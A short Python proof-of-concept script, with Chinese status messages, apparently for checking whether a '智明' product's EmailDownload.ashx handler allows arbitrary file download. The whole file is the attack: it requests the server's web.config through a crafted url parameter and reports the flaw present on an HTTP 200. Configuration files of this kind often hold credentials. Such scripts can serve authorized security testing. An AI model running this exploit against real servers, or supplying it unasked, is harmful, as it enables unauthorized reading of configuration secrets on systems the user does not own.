import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


proxies = {'http': 'http://127.0.0.1:8080'}


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    plani_url = target_url + '/file/EmailDownload.ashx?url=~/web.config&name=web.config'
    print(now_time() + " [INFO]     正在检测智明  EmailDownload 任意文件下载漏洞")
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(plani_url, headers=headers, verify=False)
        if respones1.status_code == 200:
            print(now_time() + ' [SUCCESS]  智明  EmailDownload 任意文件下载漏洞存在{}'.format(plani_url))
        else:
            print(now_time() + ' [WARNING]  智明  EmailDownload 任意文件下载漏洞不存在')
    except:
        print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ")
